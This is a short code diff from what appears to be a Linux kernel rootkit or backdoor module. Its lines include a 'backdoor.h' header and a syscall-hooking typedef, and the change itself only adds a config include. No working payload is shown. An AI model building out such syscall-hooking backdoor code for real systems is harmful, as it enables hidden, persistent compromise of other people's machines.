@@ -1,6 +1,7 @@
 #include "hooks.h"
 // backdoor header
 #include "backdoor.h"
+#include "config.h"
 
 #if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
 typedef asmlinkage long (*t_syscall)(const struct pt_regs *);
